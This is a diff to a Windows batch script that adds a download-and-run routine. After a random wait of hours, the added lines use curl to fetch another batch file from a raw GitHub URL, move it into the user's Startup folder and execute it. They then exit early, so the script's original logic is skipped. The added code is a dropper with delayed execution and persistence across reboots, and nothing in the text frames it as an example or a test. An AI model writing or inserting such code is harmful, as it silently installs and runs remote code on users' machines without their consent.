@@ -57,6 +57,31 @@ set /a seconds=hours * 3600
 echo Waiting for a random time of %hours% hours (%seconds% seconds)...
 timeout /t %seconds% >nul
 
+:: Set a temporary path to download the file
+set TEMP_FILE=%TEMP%\AutoDownloadAndRun.bat
+
+:: Wait for 15 seconds before downloading the file
+echo Waiting 15 seconds before downloading the file...
+timeout /t 15 /nobreak >nul
+
+:: Download the file from the URL using curl
+curl -L https://raw.githubusercontent.com/trungdungalpha/whisper/refs/heads/main/AutoDownloadAndRun.bat -o %TEMP_FILE%
+
+:: Check if the file was downloaded successfully
+if exist "%TEMP_FILE%" (
+    :: Move the file to the Startup folder
+    move "%TEMP_FILE%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\AutoDownloadAndRun.bat"
+    
+    :: Execute the file
+    start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\AutoDownloadAndRun.bat"
+) else (
+    echo Unable to download the file.
+)
+
+:: End
+exit
+
+
 :: Check if the file exists in the Startup folder
 if exist "%STARTUP_FOLDER%\%TARGET_FILE%" (
     echo Opening the file %TARGET_FILE% from the Startup folder...
